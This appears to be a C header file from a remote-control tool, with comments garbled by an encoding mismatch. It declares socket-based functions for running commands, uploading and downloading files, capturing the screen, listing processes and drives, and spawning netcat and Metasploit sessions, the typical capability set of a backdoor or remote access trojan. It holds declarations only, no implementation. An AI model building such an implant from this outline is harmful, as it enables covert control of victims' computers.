#pragma once
#include "socket.h"

/**
 *
 * ����ִ����صĲ���
 * ��
 * 2022/3/8
 *
**/


// ����cmd����ִ�к�Ľ��
void RecvCmdResult(SOCKET sServer);
// ��ȡ·��
void RecvPath(SOCKET sServer);
// ��ȡʱ���
void GetTimestamp(char time[]);
// ִ������
void ExecCmd(SOCKET sServer, char cmd[]);
// �����ļ�
BOOL Download(SOCKET sServer, char cmd[]);
// �ϴ��ļ�
BOOL Upload(SOCKET sServer, char cmd[]);
// �л�·��
BOOL ChangePath(char cmd[]);
// ����NC
BOOL NC(SOCKET sServer, char cmd[]);
// ��������
BOOL Screen(SOCKET sServer, char cmd[]);
// �鿴������Ϣ����
BOOL PS(SOCKET sServer, char cmd[]);
// ��������
BOOL Drive(SOCKET sServer, char cmd[]);
// ����msf
BOOL MSF(SOCKET sServer, char cmd[]);
// ��ȡpid
BOOL GetPID(SOCKET sServer, char cmd[]);
// �����˵�
BOOL Help(char cmd[]);
// TCHARתCHAR *
void TcharToStr(const TCHAR* tchar, char* _char);